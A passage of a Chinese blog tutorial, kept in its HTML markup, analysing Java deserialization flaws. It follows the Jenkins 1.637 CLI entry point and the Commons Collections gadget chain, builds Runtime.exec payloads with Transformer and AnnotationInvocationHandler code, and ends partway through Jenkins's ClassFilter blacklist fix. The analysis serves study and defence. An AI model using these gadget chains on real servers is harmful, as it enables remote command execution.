class="line">        <span class="keyword">this</span>.intField = in.readInt() + <span class="number">100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExternalizationDemo</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="keyword">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExternalizationDemo</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>序列化之后得到的二进制串如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 13  45 78 74 65 72 6e 61 6c    ....sr.. External</span><br><span class="line">69 7a 61 74 69 6f 6e 44  65 6d 6f d9 a9 04 75 84    izationD emo...u.</span><br><span class="line">5d 06 8f 0c 00 00 78 70  77 0b 00 05 67 79 79 79    ].....xp w...gyyy</span><br><span class="line">79 00 01 7d f1 78                                   y..&#125;.x</span><br></pre></td></tr></table></figure></div><p>与<code>Serializable</code>的区别：</p><ul><li>对象的序列化属性标志位为<code>0x0c</code>，包括<code>Serializable</code>和Block Data的标志</li><li>序列化类的字段个数固定为0</li><li>序列化调用<code>writeExternalData()</code>转给类自定义的写方法，将写入的数据包装在新的Block Data块中，第一个字节为块长度 <em>（不含块头尾标识）</em></li><li>反序列化调用<code>readExternalData()</code>转给类自定义的读方法，再调用对象的无参构造方法 <em>（若不存在，则返回<code>null</code>）</em> 进行实例化</li></ul><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>通过以上对Java的序列化机制的大致了解，我们可以想象一个场景 <em>（有基础的同学可以跳过本部分内容，当然，看一看也没坏处）</em> ：</p><blockquote><p>当服务端允许接收远端数据进行反序列化时，客户端可以提供任意一个服务端存在的对象 <em>（包括依赖包中的对象）</em> 的序列化二进制串，由服务端反序列化成相应对象。如果该对象是由攻击者『精心构造』的恶意对象，而它自定义的<code>readObject()</code>中存在着一些『不安全』的逻辑，那么在对它反序列化时就有可能出现安全问题。</p></blockquote><p>说到这，我提三个问题，请大家跟着我的思路去分析，先来看看第一个：</p><ol><li>为什么需要依赖反序列化对象的自定义<code>readObject()</code>？</li></ol><p>大家都知道，正常来说，反序列化只是一个对象实例化然后赋值的过程，如果之后不主动调用它的内部方法，理论上最多只能控制它字段的值而已。那么有没有什么办法能够让它执行反序列化以外的逻辑呢？毕竟做的越多中间产生问题的概率就越大。</p><p>我们还是先以大家更熟悉的PHP来举个例。在PHP内部，保留了十多个被称为魔术方法的类方法，这些魔术方法一般会伴随着类的生命周期被PHP底层自动调用，用户可以在类中显式定义它们的逻辑。</p><p>就拿与反序列化关系最密切的<code>__wakeup()</code>来说，我们回到最初的那个类<code>SerializationDemo</code>，给它加一点东西：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;stringField;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在反序列化<code>SerializationDemo</code>这个对象时，就会调用<code>__wakeup()</code>执行里面的逻辑。示例中的逻辑只是输出一个字符串，如果改成<code>exec($this-&gt;stringField);</code>呢？</p><p>实际当然不会这么简单，有可能它是把自己的字段作为值作为参数调用了某个类的方法，而那个方法里对参数做了某些不安全的操作，甚至有可能经过多个类多个方法调用，形成一个调用链。</p><p>这就是默认的反序列化逻辑的一个逃逸过程。</p><p>到这里你可能已经想到了，Java反序列化中<code>readObject()</code>的作用其实就相当于PHP反序列化中的那些魔术方法，使反序列化过程在一定程度上受控成为可能，但也只是可能而已，是否真的可控，还是需要分析每个对象的<code>readObject()</code>具体是如何实现的 <em>（别急，后面有章节会有详细介绍）</em> 。</p><p>接着看第二个问题：</p><ol start="2"><li>反序列化对象的非<code>Serializable</code>父类无参构造方法是否能像PHP中的<code>__construct()</code>一样被利用？</li></ol><p>答案应该是不行的。因为前面已经提到过，我们只能够控制反序列化对象的字段值，而Java与PHP不同的是，JDK底层会先调用无参构造方法实例化，再读取序列化的字段数据赋值，所以我们没有办法将可控的字段值在实例化阶段传入构造方法中对其内部逻辑产生影响。</p><p>最后一个：</p><ol start="3"><li><code>readResolve()</code>对反序列化漏洞有什么影响？</li></ol><p><code>readResolve()</code>只是替换反序列化结果对象，若是结果对象本身存在安全问题，它有可能让问题中断；若是<code>readObject()</code>存在安全问题，它无法避免。</p><h3 id="经典的Apache-Commons-Collections"><a href="#经典的Apache-Commons-Collections" class="headerlink" title="经典的Apache Commons Collections"></a>经典的Apache Commons Collections</h3><p>好，有了上面的基础，我们也照一回惯例，带大家一起分析一下Java历史上最出名也是最具代表性的Apache Commons Collections反序列化漏洞。</p><p>网上很多文章都是以WebLogic为漏洞环境，我们尊重开源，围绕1.637版本的Jenkins来开个头，先简单看看它的Cli组件的反序列化场景 <em>（这里只以CLI-connect协议为例，CLI2-connect会多出来一个SSL加解密的过程，这也是很多公开PoC在模拟Cli握手时选择CLI-connect协议的原因）</em> ：</p><ol><li>客户端向发送一个UTF8字符串<code>Protocol:CLI-connect</code>，前两位为字符串长度</li><li>服务端<code>TcpSlaveAgentListener</code>在接收到数据之后，会创建一个<code>ConnectionHandler</code>对象读取一个UTF8字符串，判断协议版本，交给对应的协议进行处理<ul><li><code>CliProtocol</code>响应<code>Welcome</code>字符串，由<code>ChannelBuilder</code>为两端创建一个包含了<code>Connection</code>对象 <em>（IO流对象在里面）</em> 的<code>Channel</code>通信通道，并调用<code>negotiate()</code>进行交互<ul><li><code>Capability.writePreamble()</code>响应序列化后的<code>Capability</code>对象，其中使用<code>Mode.TEXT.wrap()</code>将输出流包装为<code>BinarySafeStream</code>，它会在写时进行Base64编码</li><li>由于<code>ChannelBuilder</code>在build之前，调用了<code>withMode()</code>设置<code>mode</code>为<code>Mode.BINARY</code>，因此还会响应一个<code>0x00000000</code></li><li>等待接收后续数据，判断数据内容前缀为<code>Capability.PREAMBLE</code> <em>（<code>&lt;===[JENKINS REMOTING CAPACITY]===&gt;</code>）</em> 时，将<code>InputStream</code>传给<code>Capability.read()</code><ul><li><code>Capability</code>同样会对输入流做一次<code>BinarySafeStream</code>包装，保证在读数据时解码得到原始二进制数据，再扔给输入流的<code>readObject()</code>继续读</li></ul></li></ul></li></ul></li></ol><p>回看<code>Connection</code>中自定义的<code>readObject()</code>，是一个普普通通的<code>ObjectInputStream</code>反序列化：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>现在我们假设已知1.637版本的Jenkins引用了存在反序列化漏洞的Commons Collections的版本的Jar包，那么只需要利用它构造一个恶意对象的序列化串，在与Jenkins Cli完成握手之后，将其Base64编码后的字符串发送过去就行了 <em>（当然，千万别忘了前面那串酷酷的前缀）</em> 。</p><hr><h2 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h2><p>好的，现在让我们聚焦到Commons Collections内部，看看前辈们是如何利用它来让应用『产生』问题的。</p><p>我们先预备一个基本知识，在Java中，若想通过其原生JDK提供的接口执行系统命令，最常见的语句如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);</span><br></pre></td></tr></table></figure></div><p>很简单，一个单例模式的方法获取到<code>Runtime</code>的实例，再调用它的<code>exec()</code>执行命令。在表达式注入类RCE漏洞中也可以频繁看到利用各种条件特性来构造这段语句的身影，比如Struts2的OGNL：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(cmd)</span><br></pre></td></tr></table></figure></div><p>又比如Spring的SpEL：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure></div><p>这里替小白问个基础但又和接下来的内容有关的问题：为什么都要使用链式结构？</p><p>原因其实很简单，因为无论是表达式解析执行还是反序列化时，底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的。你也可以换个方式问自己，如果你第一次请求<code>Runtime.getRuntime()</code>，那如何保证第二次请求<code>rt.exec()</code>能够拿到第一次的<code>Runtime</code>对象呢？</p><p>了解了这个问题之后，我们就可以开始尝试用Commons Collections先来构造这个链式结构了。</p><p>前辈们为我们在Commons Collections中找到了一个用于对象之间转换的<code>Transformer</code>接口，它有几个我们用得着的实现类：</p><ol><li><code>ConstantTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><code>InvokerTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><code>ChainedTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p>利用这几个对象，可以构造出下面这条链：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;),</span><br><span class="line">        new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;;</span><br><span class="line">Transformer chain = <span class="keyword">new</span> ChainedTransformer(trans);</span><br></pre></td></tr></table></figure></div><p>其中，数组的中间两个元素是最让人费解的，我们一句一句来解释 <em>（前方高能预警，请对照上面几个<code>Transformer</code>的逻辑仔细看，接下来的内容网上有些解释是存在出入的）</em> ：</p><ol><li>构造一个<code>ConstantTransformer</code>，把<code>Runtime</code>的<code>Class</code>对象传进去，在<code>transform()</code>时，始终会返回这个对象</li><li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>getMethod</code>，参数为<code>getRuntime</code>，在<code>transform()</code>时，传入1的结果，此时的<code>input</code>应该是<code>java.lang.Runtime</code>，但经过<code>getClass()</code>后，<code>cls</code>为<code>java.lang.Class</code>，之后的<code>getMethod()</code>只能获取<code>java.lang.Class</code>的方法，因此才会定义的待调用方法名为<code>getMethod</code>，然后其参数才是<code>getRuntime</code>，它得到的是<code>getMethod</code>这个方法的<code>Method</code>对象，<code>invoke()</code>调用这个方法，最终得到的才是<code>getRuntime</code>这个方法的<code>Method</code>对象</li><li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>invoke</code>，参数为空，在<code>transform()</code>时，传入2的结果，同理，<code>cls</code>将会是<code>java.lang.reflect.Method</code>，再获取并调用它的<code>invoke</code>方法，实际上是调用上面的<code>getRuntime()</code>拿到<code>Runtime</code>对象</li><li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>exec</code>，参数为命令字符串，在<code>transform()</code>时，传入3的结果，获取<code>java.lang.Runtime</code>的<code>exec</code>方法并传参调用</li><li>最后把它们组装成一个数组全部放进<code>ChainedTransformer</code>中，在<code>transform()</code>时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求</li></ol><p>既然第2、3步这么绕，我们又知道了为什么，是不是可以考虑用下面这种逻辑更清晰的方式来构造呢：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure></div><p>答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于<code>Runtime.getRuntime()</code>得到的是一个对象，这个对象也需要参与序列化过程，而<code>Runtime</code>本身是没有实现<code>Serializable</code>接口的，所以会导致序列化失败。</p><p>也有同学可能看过ysoserial构造的Payload，它的习惯是先定义一个包含『无效』<code>Transformer</code>的<code>ChainedTransformer</code>，等所有对象装填完毕之后再利用反射将实际的数组放进去。这么做的原因作者也在一个<a href="https://github.com/frohoff/ysoserial/issues/32" target="_blank" rel="noopener">Issue</a>中给了解释，我们直接看原文：</p><blockquote><p>Generally any reflection at the end of gadget-chain set up is done to “arm” the chain because constructing it while armed can result in premature “detonation” during set-up and cause it to be inert when serialized and deserialized by the target application.</p></blockquote><p>现在，有了这条<code>Transformer</code>链，就等着谁来执行它的<code>transform()</code>了。</p><p>网上流传的示例很多都是使用一个名为<code>TransformedMap</code>的装饰器来触发<code>transform()</code>，它在装饰时会传入原始<code>Map</code>、一个键转换器<code>Transformer</code>和一个值转换器<code>Transformer</code>，而它的父类在内部实现了一个<code>AbstractMapEntryDecorator</code>的子类，会在<code>setValue()</code>前调用<code>checkSetValue()</code>进行检查，而<code>TransformedMap.checkSetValue()</code>会调用它的值转换器的<code>transform()</code>，因此装饰任意一个有元素的<code>Map</code>就可以满足需求：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map m = TransformedMap.decorate(<span class="keyword">new</span> HashMap()&#123;&#123; put(<span class="string">"value"</span>, <span class="string">"anything"</span>); &#125;&#125;, <span class="keyword">null</span>, chain);</span><br></pre></td></tr></table></figure></div><p>这时，我们只需要再找一个包含可控<code>Map</code>字段，并会在反序列化时对这个<code>Map</code>进行<code>setValue()</code>或<code>get()</code>操作的公共对象。</p><p>幸运的是，前辈们在JDK较早的版本中发现了<code>AnnotationInvocationHandler</code>这个对象 <em>（较新版本的JDK可以使用<code>BadAttributeValueExpException</code>，在这里就不展开了）</em> ，它在初始化时可以传入一个<code>Map</code>类型参数赋值给字段<code>memberValues</code>，<code>readObject()</code>过程中如果满足一定条件就会对<code>memberValues</code>中的元素进行<code>setValue()</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    s.<span class="title">defaultReadObject</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                    value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以看到，在遍历<code>memberValues.entrySet()</code>时，会用键名在<code>memberTypes</code>中尝试获取一个<code>Class</code>，并判断它是否为<code>null</code>，这就是刚才说的需要满足的条件。接下来是网上很少提到过的一个结论：</p><p>首先，<code>memberTypes</code>是<code>AnnotationType</code>的一个字段，里面存储着<code>Annotation</code>接口声明的方法信息 <em>（键名为方法名，值为方法返回类型）</em> 。因此，我们在获取<code>AnnotationInvocationHandler</code>实例时，需要传入一个方法个数大于0的<code>Annotation</code>子类 <em>（一般来说，若方法个数大于0，都会包含一个名为<code>value</code>的方法）</em> ，并且原始<code>Map</code>中必须存在任意以这些方法名为键名的元素，且元素值不是该方法返回类型的实例，才能顺利进入<code>setValue()</code>的流程：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor ctor = cls.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">m</span>)</span>;</span><br></pre></td></tr></table></figure></div><p>以上是<code>TransformedMap</code>的利用构造过程。而ysoserial官方更倾向于使用<code>LazyMap</code>作为装饰器，它在装饰时会传入原始<code>Map</code>和一个<code>Transformer</code>作为工厂，当<code>get()</code>获取值时，若键不存在，就会调用工厂的<code>transform()</code>创建一个新值放入<code>Map</code>中，因此装饰任意一个空<code>Map</code>也可以满足需求：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map m = LazyMap.decorate(<span class="keyword">new</span> HashMap(), chain);</span><br></pre></td></tr></table></figure></div><p>但与<code>TransformedMap</code>不同的是，<code>AnnotationInvocationHandler.readObject()</code>中并没有直接的对<code>memberTypes</code>执行<code>get()</code>操作，反而是在它的<code>invoke()</code>中存在<code>get()</code>，但又对方法名有一定的要求：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">    String member = method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"equals"</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line">        return equalsImpl(args[0]);</span><br><span class="line">    <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"toString"</span>))</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"hashCode"</span>))</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"annotationType"</span>))</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">    Object result = memberValues.get(member);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>所以，ysoserial使用Java动态代理的方式处理了 <code>LazyMap</code> ，使 <code>readObject()</code>在调用<code>memberValues.entrySet()</code> 时代理进入<code>AnnotationInvocationHandler.invoke()</code>阶段，刚好方法名<code>entrySet</code>也可以顺利的跳过前面的几个判断条件，最终达到目的。这也是为什么Payload中会包含两个<code>AnnotationInvocationHandler</code>的原因。</p><hr><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>Jenkins在1.638版本的 <code>Connection.readObject()</code> 中，将默认的<code>ObjectInputStream</code>改为了其自定义的子类<code>ObjectInputStreamEx</code>，并传入<code>ClassFilter.DEFAULT</code>校验过滤：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStreamEx(in,</span><br><span class="line">            getClass().getClassLoader(), ClassFilter.DEFAULT);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>ClassFilter.DEFAULT</code> 长这样：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> ClassFilter DEFAULT = <span class="keyword">new</span> ClassFilter() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isBlacklisted</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.startsWith(<span class="string">"org.codehaus.groovy.runtime."</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.startsWith(<span class="string">"org.apache.commons.collections.functors."</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> 